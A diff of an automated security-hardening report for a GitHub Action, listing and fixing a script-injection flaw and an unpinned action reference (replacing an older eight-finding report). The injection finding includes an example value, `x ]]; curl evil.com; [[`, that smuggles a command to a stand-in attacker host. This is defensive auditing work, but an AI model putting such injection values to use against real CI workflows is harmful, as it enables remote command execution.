@@ -10,94 +10,34 @@
 
 **Harden Agent Version:** `2`
 
-Action **Azure--k8s-create-secret/v6.0.0** was hardened automatically. 8 finding(s) were identified and resolved across 1 iteration(s).
+Action **Azure--k8s-create-secret/v6.0.0** was hardened automatically. 2 finding(s) were identified and resolved across 1 iteration(s).
 
 ## Findings Fixed
 
-### hardcoded-credentials (severity: high)
+### script-injection (severity: high)
 
-Literal plaintext credentials are hardcoded in the integration test workflow. The value 'test-Pass1' is assigned directly to `container-registry-password:` (line 55) and also passed as `--docker-password=test-Pass1` in a kubectl run command (line 60). These are not GitHub Actions secret expressions and match the hardcoded-credentials pattern.
+Sub-rule (a): The `run:` block in the composite action directly interpolates `${{ inputs.pr-base-ref }}` into shell commands without routing through an env var. The value appears twice: (1) unquoted in `echo ${{ inputs.pr-base-ref }}`, allowing word-splitting and glob expansion; (2) inside a double-quoted string in `if [[ "${{ inputs.pr-base-ref }}" != releases/* ]]`, where the expression is substituted by the Actions runner before the shell sees it, allowing injection of arbitrary shell syntax (e.g., a value like `x ]]; curl evil.com; [[` would break out of the conditional). Both occurrences are direct expression interpolations inside a `run:` shell script and must be replaced with env-var references that are properly double-quoted.
 
 Locations:
 
-- `.github/workflows/integration-tests.yml:55`
-- `.github/workflows/integration-tests.yml:60`
+- `.github/actions/setup-test-environment/action.yml:30`
+- `.github/actions/setup-test-environment/action.yml:31`
 
 ### unpinned-uses (severity: high)
 
-The workflow uses an unpinned branch ref `@main` for an external reusable workflow: `uses: OliverMKing/javascript-release-workflow/.github/workflows/tag-and-release.yml@main`. A branch ref is mutable and can be updated to point to arbitrary code, enabling supply-chain attacks. It must be pinned to a full 40-character commit SHA.
+The composite action references `medyagh/setup-minikube@latest`, which uses a mutable branch/tag ref instead of a pinned 40-character commit SHA. This means the action can be silently updated (or compromised) without any change to this file, creating a supply-chain risk. It should be pinned to a full SHA, e.g. `medyagh/setup-minikube@<40-char-sha> # latest`.
 
 Locations:
 
-- `.github/workflows/tag-and-draft.yml:9`
-
-### unpinned-uses (severity: high)
-
-The workflow uses an unpinned tag ref `@v1` for an external reusable workflow: `uses: Azure/action-release-workflows/.github/workflows/release_js_project.yaml@v1`. A tag ref is mutable and can be force-pushed to point to arbitrary code, enabling supply-chain attacks. It must be pinned to a full 40-character commit SHA.
-
-Locations:
-
-- `.github/workflows/release-pr.yml:14`
-
-### missing-permissions (severity: medium)
-
-The workflow file has no top-level `permissions:` key and none of its jobs define a `permissions:` block. Without explicit permissions, the workflow inherits the repository's default token permissions (which may be `write-all`), violating the principle of least privilege.
-
-Locations:
-
-- `.github/workflows/defaultLabels.yml:1`
-
-### missing-permissions (severity: medium)
-
-The workflow file has no top-level `permissions:` key and none of its jobs define a `permissions:` block. Without explicit permissions, the workflow inherits the repository's default token permissions (which may be `write-all`), violating the principle of least privilege.
-
-Locations:
-
-- `.github/workflows/integration-tests.yml:1`
-
-### missing-permissions (severity: medium)
-
-The workflow file has no top-level `permissions:` key and none of its jobs define a `permissions:` block. Without explicit permissions, the workflow inherits the repository's default token permissions (which may be `write-all`), violating the principle of least privilege.
-
-Locations:
-
-- `.github/workflows/prettify-code.yml:1`
-
-### missing-permissions (severity: medium)
-
-The workflow file has no top-level `permissions:` key and none of its jobs define a `permissions:` block. Without explicit permissions, the workflow inherits the repository's default token permissions (which may be `write-all`), violating the principle of least privilege.
-
-Locations:
-
-- `.github/workflows/tag-and-draft.yml:1`
-
-### missing-permissions (severity: medium)
-
-The workflow file has no top-level `permissions:` key and none of its jobs define a `permissions:` block. Without explicit permissions, the workflow inherits the repository's default token permissions (which may be `write-all`), violating the principle of least privilege.
-
-Locations:
-
-- `.github/workflows/unit-tests.yml:1`
+- `.github/actions/setup-test-environment/action.yml:26`
 
 ## Iteration Notes
 
 ### Iteration 1
 
-**Fixes applied:** hardcoded-credentials, unpinned-uses, missing-permissions
+**Fixes applied:** unpinned-uses, script-injection
 
 **Notes:**
 
-Fixed all 8 findings across 6 workflow files:
-
-1. integration-tests.yml: Replaced hardcoded 'test-Pass1' password (lines 55, 60) with ${{ secrets.TEST_REGISTRY_PASSWORD }} secret reference. Added `permissions: contents: read` top-level block.
-
-2. tag-and-draft.yml: Pinned OliverMKing/javascript-release-workflow @main to full SHA a2f171c6ca04fea2de31f4dbb6dc576140395512. Added `permissions: {}` top-level block.
-
-3. release-pr.yml: Pinned Azure/action-release-workflows @v1 to full SHA 3c677ba5ab58f5c5c1a6f0cfb176b333b1f27405. (Job already had permissions block.)
-
-4. defaultLabels.yml: Added `permissions: issues: write` and `pull-requests: write` (minimum needed for actions/stale to label and manage issues/PRs).
-
-5. prettify-code.yml: Added `permissions: contents: read` top-level block.
-
-6. unit-tests.yml: Added `permissions: contents: read` top-level block.
+1. Pinned `medyagh/setup-minikube@latest` to full commit SHA `e9e035a86bbc3caea26a450bd4dbf9d0c453682e` with `# latest` comment for readability. 2. Moved `${{ inputs.pr-base-ref }}` into the step's `env:` block as `PR_BASE_REF` and replaced both inline interpolations with properly double-quoted `"$PR_BASE_REF"` references, preventing shell injection and word-splitting/glob-expansion issues.
 
